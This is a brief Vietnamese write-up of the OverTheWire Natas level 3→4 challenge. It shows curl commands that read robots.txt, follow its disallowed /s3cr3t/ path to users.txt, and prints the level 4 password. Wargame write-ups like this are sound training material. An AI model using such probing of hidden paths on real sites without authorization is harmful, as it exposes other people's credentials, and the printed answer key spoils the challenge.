# Natas 3 → 4

## Mục tiêu

Tìm thư mục bị crawler cấm.

## Tôi thấy

`robots.txt` disallow `/s3cr3t/`; file users.txt nằm trong đó.

## Cách làm

```bash
curl -u natas3:<password> http://natas3.natas.labs.overthewire.org/robots.txt
curl -u natas3:<password> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

## Vì sao cách này hiệu quả

robots.txt không phải access control; nó chỉ vô tình tiết lộ đường dẫn.

## Kết quả

Password của `natas4`:

```text
JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
```
